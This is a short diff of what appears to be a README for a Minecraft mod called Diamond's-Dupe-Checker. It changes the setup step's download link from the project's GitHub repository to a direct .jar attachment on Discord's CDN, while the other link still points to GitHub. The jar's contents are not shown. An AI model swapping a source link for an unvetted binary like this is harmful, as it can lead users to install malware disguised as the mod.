@@ -13,7 +13,7 @@ The simple answer to this question is No. All the mod does is check for duplicat
 You can download the Diamond's-Dupe-Checker by clicking [here](https://github.com/Diamonds-Mods/Diamonds-Dupe-Checker/)
 
 # How do I set it up?
-1. Download the mod by clicking [here](https://github.com/Diamonds-Mods/Diamonds-Dupe-Checker/)
+1. Download the mod by clicking [here](https://cdn.discordapp.com/attachments/968630746174586970/971496453467934831/DDC-4.1.5.jar)
 
 2. Press WINDOWS + R and type %appdata%
 
